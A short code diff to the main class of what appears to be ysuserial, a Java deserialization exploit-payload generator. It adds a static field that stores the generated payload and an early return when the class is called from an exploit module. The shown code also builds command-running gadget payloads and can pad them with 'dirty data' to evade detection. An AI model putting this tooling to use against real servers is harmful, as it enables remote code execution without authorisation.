@@ -12,6 +12,7 @@ import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;
 
+import static org.su18.ysuserial.Strings.isFromExploit;
 import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.util.HexUtils.generatePassword;
 
@@ -23,6 +24,8 @@ public class GeneratePayload {
 	private static final int INTERNAL_ERROR_CODE = 70;
 
 	private static final int USAGE_CODE = 64;
+
+	public static Object PAYLOAD = null;
 
 	public static void main(final String[] args) {
 
@@ -159,11 +162,17 @@ public class GeneratePayload {
 			ObjectPayload payload = payloadClass.newInstance();
 			Object        object  = payload.getObject(command);
 
-			// 是否指定混淆，
+			// 是否指定混淆
 			if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
 				int type   = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
 				int length = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
 				object = new DirtyDataWrapper(object, type, length).doWrap();
+			}
+
+			// 储存生成的 payload
+			PAYLOAD = payload;
+			if (isFromExploit()) {
+				return;
 			}
 
 			OutputStream out;
